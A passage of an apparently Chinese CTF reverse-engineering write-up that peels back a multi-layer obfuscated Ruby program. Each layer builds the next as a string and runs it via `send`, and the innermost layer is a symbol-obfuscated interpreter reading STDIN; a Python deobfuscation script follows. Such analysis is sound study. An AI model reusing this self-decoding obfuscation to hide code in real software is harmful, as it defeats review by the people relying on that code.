class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func6</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|3;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func7()</span><br><span class="hljs-params">$lI1lll=$lI1lll*8;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func8()</span><br><span class="hljs-params">$lI1lll=$lI1lll-3;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func9()</span><br><span class="hljs-params">$lI1lll=$lI1lll%1;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func10()</span><br><span class="hljs-params">$lI1lll=$lI1lll&amp;10;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func11()</span><br><span class="hljs-params">$lI1lll=$lI1lll-4;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func12()</span><br><span class="hljs-params">$lI1lll=$lI1lll%2;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func13()</span><br><span class="hljs-params">$lI1lll=$lI1lll|</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1func5</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|5;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func15()</span><br><span class="hljs-params">$lI1lll=$lI1lll%10;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func16()</span><br><span class="hljs-params">$l1Il=$l1Il+$lI1lll.chr;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func17()</span><br><span class="hljs-params">$lI1lll=$lI1lll*9;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func18()</span><br><span class="hljs-params">$lI1lll=$lI1lll-8;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func19()</span><br><span class="hljs-params">$lI1lll=$lI1lll+5;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func20()</span><br><span class="hljs-params">$lI1lll=$lI1lll&amp;9;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func21()</span><br><span class="hljs-params">send($l1Il[0,4], $l1Il[4,$l1Il.length]);</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">func2;</span><br></code></pre></td></tr></table></figure><p><code>func21()</code> 中有一个 <code>send</code>，ruby 中的 send 貌似可以执行代码，修改代码，在 func21 调用时输出 <code>$l1Il[4,$l1Il.length]</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> func<span class="hljs-number">21</span>()<br><span class="hljs-attribute">print</span> $l<span class="hljs-number">1</span>Il[<span class="hljs-number">4</span>,$l<span class="hljs-number">1</span>Il.length]<br><span class="hljs-attribute">send</span>($l<span class="hljs-number">1</span>Il[<span class="hljs-number">0</span>,<span class="hljs-number">4</span>], $l<span class="hljs-number">1</span>Il[<span class="hljs-number">4</span>,$l<span class="hljs-number">1</span>Il.length]);<br><span class="hljs-attribute">end</span>;<br></code></pre></td></tr></table></figure><p>输出得到另外一个 ruby 程序。总结一下，第一层 ruby 程序计算出第二层 ruby 程序的字符串并调用第二层 ruby 程序。</p><h2 id="第二层-ruby-程序"><a href="#第二层-ruby-程序" class="headerlink" title="第二层 ruby 程序"></a>第二层 ruby 程序</h2><p>第二层 ruby 程序混淆规则也类似第一层的 ruby 程序。</p><p>节选第二层 ruby 程序</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$llll</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$llII</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1llI</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">7</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ll1III</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">7</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lllI</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>/<span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lIl1l</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-number">-3</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1lll</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">10</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l11I1I</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-number">10</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1l1</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>&amp;<span class="hljs-number">7</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1II</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">8</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ll1I</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">8</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ll11</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>^<span class="hljs-number">6</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ll1l1I</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">1</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI1Il</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">3</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">llI1I</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>+<span class="hljs-number">6</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">llIl1</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>*<span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI1ll</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>*<span class="hljs-number">5</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1111</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>^<span class="hljs-number">7</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1lII</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>^<span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lIIl</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">5</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lII11</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>+<span class="hljs-number">9</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI11I</span></span>()<span class="hljs-variable">$llll</span>=<span class="hljs-variable">$llll</span>+<span class="hljs-variable">$l1lI1l</span>.chr;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1IlI</span></span>()send(<span class="hljs-variable">$llll</span>[0,<span class="hljs-number">4</span>], <span class="hljs-variable">$llll</span>[<span class="hljs-number">4</span>,<span class="hljs-variable">$llll</span>.length]);<span class="hljs-keyword">end</span>;l11I1I;lII11;lI1ll;llI1I;lI11I;l11I1I;l1llI;lII11;lI1ll;l1llI;lIl1l;lIl1l;lIl1l;lI11I;l11I1I;ll1l1I;lII11;lI1ll;lIl1l;lI11I;l11I1I;lII11;l1lll;llIl1;lI11I;l11I1I;lII11;lI1ll;llI1I;lIl1l;lI11I;l11I1I;lII11;lI1ll;llI1I;lI11I;l11I1I;l1llI;lII11;llIl1;l1llI;lI11I;l11I1I;l1llI;llI1I;lI1ll;lI11I;l11I1I;llI1I;ll11;lI1ll;lI11I;l11I1I;l1llI;l1111;llIl1;lI11I;l11I1I;l1llI;ll11;llIl1;lI11I;l11I1I;lII11;lI1ll;lI11I;l11I1I;l1llI;llIl1;ll1l1I;lI11I;l11I1I;l1llI;ll11;llIl1;lI11I;l11I1I;l1llI;ll11;llIl1;lI11I;l11I1I;lI1ll;lIl1l;lI11I;l11I1I;l1llI;ll11;llIl1;lI11I;l11I1I;l1llI;ll1<br>......【节选】<br></code></pre></td></tr></table></figure><p>继续用第一层处理方法处理第二层代码，得到如下代码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$llll</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$llII</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|7;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func2()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l%7;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func3()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l/4;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func4()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l-3;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func5()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l|</span><span class="hljs-number">10</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func6</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func7</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>&amp;<span class="hljs-number">7</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func8</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">8</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func9</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|8;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func10()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l^6;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func11()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l|</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func12</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|3;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func13()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l+6;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func14()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l*4;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func15()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l*5;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func16()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l^7;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func17()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l^4;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func18()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l%5;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func19()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l+9;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func20()</span><br><span class="hljs-params">$llll=$llll+$l1lI1l.chr;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func21()</span><br><span class="hljs-params">send($llll[0,4], $llll[4,$llll.length]);</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">func6;</span><br><span class="hljs-params">func19;</span><br><span class="hljs-params">func15;</span><br><span class="hljs-params">func13;</span><br><span class="hljs-params">.....[节选]</span><br></code></pre></td></tr></table></figure><p>继续输出 func21 中 send 的参数得到第三层 ruby 程序</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">begin</span> <span class="hljs-variable">$_</span>=<span class="hljs-variable">$$</span>/<span class="hljs-variable">$$</span>;<br><span class="hljs-variable">@_</span>=<span class="hljs-variable">$_</span>+<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$-</span>_=<span class="hljs-variable">$_</span>-<span class="hljs-variable">@_</span>;<br><span class="hljs-variable">$__</span>=-&gt;_&#123;_==[]<span class="hljs-params">||</span>_==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-variable">$.</span><span class="hljs-symbol">:</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$__</span>[_[<span class="hljs-variable">$_</span>..<span class="hljs-variable">$-</span>_]]&#125;<br><span class="hljs-variable">@__</span>=-&gt;_,&amp;__&#123;_==[]?[]<span class="hljs-symbol">:</span>[__[_[<span class="hljs-variable">$.</span>]]]+<span class="hljs-variable">@__</span>[_[<span class="hljs-variable">$_</span>..<span class="hljs-variable">$-</span>_],&amp;__]&#125;<br><span class="hljs-variable">$_____</span>=-&gt;_&#123;<span class="hljs-variable">@__</span>[[*_],&amp;-&gt;__&#123;__[<span class="hljs-variable">$.</span>]&#125;]&#125;<br><span class="hljs-variable">@_____</span>=-&gt;_&#123;<span class="hljs-variable">@__</span>[[*_],&amp;-&gt;__&#123;__[<span class="hljs-variable">$-</span>_]&#125;]&#125;<br><span class="hljs-variable">$______</span>=-&gt;_&#123;___,______=<span class="hljs-variable">$_____</span>[_],<span class="hljs-variable">@_____</span>[_];_____=<span class="hljs-variable">$__</span>[___];____=&#123;&#125;;__=<span class="hljs-variable">$.</span>;(_=-&gt;&#123;<br>  ____[______[__]]=___[__];(__+=<span class="hljs-variable">$_</span>)==_____ ?<span class="hljs-symbol">____:</span>_[]&#125;)[]&#125;<br><span class="hljs-variable">@______</span>=-&gt;_,__&#123;_=[*_]+[*__];____=<span class="hljs-variable">$__</span>[_];___=&#123;&#125;;__=<span class="hljs-variable">$.</span>;(_____=-&gt;&#123;<br>  ___[_[__][<span class="hljs-variable">$.</span>]]=_[__][<span class="hljs-variable">$_</span>];(__+=<span class="hljs-variable">$_</span>)==____ ?<span class="hljs-symbol">___:</span>_____[]&#125;)[]&#125;<br><span class="hljs-variable">$_______</span>=-&gt;_&#123;<span class="hljs-variable">$___</span>=[];<span class="hljs-variable">@___</span>=<span class="hljs-variable">$__</span>[_];__=___=____=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$____</span>,<span class="hljs-variable">@____</span>=&#123;&#125;,[]<br>(_____=-&gt;&#123;<br>  _[____]==<span class="hljs-string">&#x27;5&#x27;</span>?(<span class="hljs-variable">@____</span>&lt;&lt;____)<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>  _[____]==<span class="hljs-string">&#x27;6&#x27;</span>?(<span class="hljs-variable">$____</span>[<span class="hljs-variable">@____</span>[<span class="hljs-variable">$-</span>_]]=____;<span class="hljs-variable">@____</span>=<span class="hljs-variable">@____</span>[<span class="hljs-variable">$.</span>..<span class="hljs-variable">$.</span>-<span class="hljs-variable">@_</span>])<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>  (____+=<span class="hljs-variable">$_</span>)==<span class="hljs-variable">@__</span>_?<span class="hljs-variable">$.</span><span class="hljs-symbol">:_____[]</span>&#125;)[]<br><span class="hljs-variable">$____</span>=<span class="hljs-variable">$____</span>==&#123;&#125;?&#123;&#125;<span class="hljs-symbol">:</span><span class="hljs-variable">@______</span>[<span class="hljs-variable">$____</span>,<span class="hljs-variable">$______</span>[<span class="hljs-variable">$____</span>]]<br>(______=-&gt;&#123;_[__]==<br><span class="hljs-string">&#x27;0&#x27;</span>?(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]+=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;1&#x27;</span>?(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]-=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;2&#x27;</span>?(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]=STDIN.getc.ord)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;3&#x27;</span><span class="hljs-string">?(</span>___+=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;4&#x27;</span><span class="hljs-string">?(</span>___-=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;5&#x27;</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)==<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>____[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;6&#x27;</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)!=<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>____[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;7&#x27;</span>?(<span class="hljs-variable">$&gt;</span>&lt;&lt;(<span class="hljs-string">&#x27;&#x27;</span>&lt;&lt;<span class="hljs-variable">$___</span>[___]))<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>(__+=<span class="hljs-variable">$_</span>)==<span class="hljs-variable">@__</span>_?<span class="hljs-symbol">_:</span>______[]&#125;)[]&#125;<br><span class="hljs-variable">$_______</span>[<span class="hljs-string">&#xx27;</span>];<span class="hljs-keyword">rescue</span> Exception;<span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="第三层-ruby-程序"><a href="#第三层-ruby-程序" class="headerlink" title="第三层 ruby 程序"></a>第三层 ruby 程序</h2><p>主要是变量名的反混淆，用正则表达式匹配后替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;3.rb&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br>target = <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$_[^_]&quot;</span>, data, re.M | re.S):<br>    <span class="hljs-keyword">if</span> i[-<span class="hljs-number">1</span>] != <span class="hljs-string">&quot;=&quot;</span>:<br>        print(i)<br>        data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># @_</span><br>target = <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@_[^_]&quot;</span>, data, re.M | re.S):<br>    <span class="hljs-keyword">if</span> i[-<span class="hljs-number">1</span>] != <span class="hljs-string">&quot;=&quot;</span>:<br>        print(i)<br>        data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $-_ =&gt; -1</span><br><br>target = <span class="hljs-string">&#x27;-1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$-_[^_]&quot;</span>, data, re.M | re.S):<br>    <span class="hljs-keyword">if</span> i[-<span class="hljs-number">1</span>] != <span class="hljs-string">&quot;=&quot;</span>:<br>        print(i)<br>        data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $__ -&gt; proc1</span><br><br>target = <span class="hljs-string">&#x27;$proc1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$__[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = 